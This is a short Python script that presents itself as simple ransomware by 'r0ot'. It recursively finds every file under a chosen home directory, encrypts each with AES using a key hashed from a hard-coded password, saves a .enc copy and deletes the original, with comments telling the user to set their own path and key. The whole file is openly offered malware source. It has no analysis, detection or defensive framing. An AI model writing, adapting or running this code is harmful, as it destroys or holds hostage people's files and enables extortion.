#!/usr/bin/python
# Cryptofuck: it's a simple ransomware coded using pycrypto module in python 

from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os


class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()



print(cl.red+"""

[+] Coded By: r0ot
-------V1.5--------

"""+cl.end)



def getkey(password):
	hasher = SHA256.new(password.encode('utf-8'))
	return hasher.digest()



def write(word):
	stdout.write(word+"                                         \r")
	stdout.flush()
	return True



def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = str(filename)+".enc"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)

	encryptor = AES.new(key, AES.MODE_CBC, IV)
	try:
		with open(filename, 'rb') as infile:
			with open(outputFile, 'wb') as outfile:
				outfile.write(filesize.encode('utf-8'))
				outfile.write(IV)

				while True:
					chunk = infile.read(chunksize)

					if len(chunk) == 0:
						break 
					elif len(chunk) % 16 != 0:
						chunk += b' ' * (16 - (len(chunk) % 16))

					outfile.write(encryptor.encrypt(chunk))
	except IOError:
		pass




#change this path to yours
p = Path('/home/r0ot/')

#change this key with your key, remember the key must be base64 encode
key = "cjBvMQ=="

list_f = []


#extensions list
extensions = ["*"]# ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']

#f = raw_input("the files format> ")

for extension in extensions:
	try:
		searche = list(p.glob('**/*.{}'.format(extension)))
	
		for File in searche:
			File = str(File)
			if File.endswith(".enc"):
				pass
			else:
				#x = x.split("/")[-1]
				list_f.append(File)
				#print(x)
	except OSError:
		print("you must be root !")


for i in list_f:
	file_name = i.split("/")[-1]
	file_path = i.replace(file_name, "")

	word = cl.blue+"Encryption: "+cl.end+str(file_name)
	write(word)
	os.chdir(file_path)
	encrypt(getkey(base64.b64decode(key)), file_name)
	try:
		os.remove(file_name)
	except OSError:
		pass
	
print("\n* Done *")
